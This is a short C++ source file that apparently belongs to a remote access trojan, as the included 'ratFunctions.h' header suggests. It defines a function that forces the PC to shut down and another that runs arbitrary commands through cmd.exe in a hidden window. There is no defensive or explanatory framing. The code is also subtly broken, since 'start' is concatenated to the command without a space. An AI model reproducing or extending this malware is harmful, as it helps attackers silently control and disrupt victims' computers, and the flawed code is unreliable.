#include <stdio.h>
#include <Windows.h>
#include <winsock.h>
#include <tchar.h>
#include <iostream>
#include <string.h>
#include "ratFunctions.h"

void ShutDownPc(void) 
{
	ExecCommand("shutdown -f");
}

int ExecCommand(std::string command)
{
	STARTUPINFO si;
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	std::string finas = "C:\\Windows\\System32\\cmd.exe /C start";
	finas += command;
	PROCESS_INFORMATION pi;
	BOOL res = CreateProcessA(NULL,
		(LPSTR)finas.c_str(),
		NULL, NULL,
		FALSE, CREATE_NO_WINDOW,
		NULL, NULL,
		(LPSTARTUPINFOA)&si, &pi);
	if (!res)
		return 1;
	else
	{
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return 0;
	}
}